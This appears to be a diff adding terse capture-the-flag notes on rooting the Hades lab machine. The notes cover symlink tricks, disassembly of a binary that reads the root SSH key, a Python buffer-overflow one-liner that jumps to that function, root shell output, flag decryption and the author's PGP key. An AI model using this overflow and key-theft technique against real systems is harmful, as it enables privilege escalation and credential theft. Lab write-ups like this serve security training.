@@ -1,0 +1,109 @@
+#overwrite symlink reboot
+ln -sf /bin/hostname /usr/sbin/reboot
+#back the symlink
+ln -sf /bin/systemctl /usr/sbin/reboot
+
+#=> counter file
+reboot function follow iterarates on counter. if content of counter file equal >=2 the machine will reboot after password prompt.
+
+#=> display_key
+## evil function
+0x80482e5:	mov    DWORD PTR [esp],0x80ab50c	=> push "/sbin/reboot"
+0x80482ec:	call   0x80493b0					=> syscall system ?
+
+#=> print the root private key
+0x8048254:	push   ebp
+0x8048255:	mov    ebp,esp
+0x8048257:	sub    esp,0x18
+0x804825a:	mov    DWORD PTR [esp],0x80ab4e8	=> push "cat /root/.ssh/id_rsa"
+0x8048261:	call   0x80493b0					=> syscall system ?
+0x8048266:	leave  
+0x8048267:	ret    
+
+=> create alias cat to spawn /bin/sh is useless cuz there's no setuid in this binary.
+
+0x8049371:	mov    DWORD PTR [esp],0x80ab635	=> push "/bin/sh"
+0x8049378:	mov    DWORD PTR [esp+0x8],eax
+0x804937c:	lea    eax,[ebp-0x34]
+0x804937f:	mov    DWORD PTR [esp+0x4],eax
+0x8049383:	call   0x8056910					=> not a syscall ?
+
+=> rop rop rop!
+
+...[progress]...
+0x804832d -> secret ?
+0x804837b -> main
+
+=> or just spawn the cat root Oww:
+
+loki@Hades:~$ python -c "print 'A'*20+__import__('struct').pack('<I',0x8048254)" | /display_root_ssh_key/display_key
+
+=> get root priviledge from the private key
+
+root@Hades:~# cat /home/loki/notes 
+AES 256 CBC
+Good for you and good for me.
+root@Hades:~# openssl enc -aes-256-cbc -d -in flag.txt.enc -out flag.txt -pass file:/key_file 
+root@Hades:~# ls
+flag.txt  flag.txt.enc
+root@Hades:~# cat flag.txt
+Congratulations on completing Hades.
+
+Feel free to ping me on #vulnhub and tell me what you thought.
+
+The PGP key below can be used to encrypt solution submissions, and to prove you got through it all.
+
+-Lok_Sigma
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
+Comment: GPGTools - http://gpgtools.org
+
+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
+=tmFl
+-----END PGP PUBLIC KEY BLOCK-----
